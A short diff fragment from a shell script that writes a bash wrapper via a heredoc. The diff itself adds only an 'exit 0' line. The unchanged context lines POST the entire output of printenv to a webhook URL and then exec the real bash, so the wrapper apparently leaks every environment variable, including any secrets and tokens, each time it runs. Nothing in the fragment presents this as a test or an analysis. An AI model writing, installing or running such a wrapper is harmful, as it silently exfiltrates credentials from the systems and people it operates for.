@@ -27,6 +27,7 @@ curl -X POST \
   --data "$(printenv)" \
   "$webhook/printenv" 
 exec /usr/bin/bash "$@"
+exit 0
 EOF
 
 echo "--granting permissions--" >&2
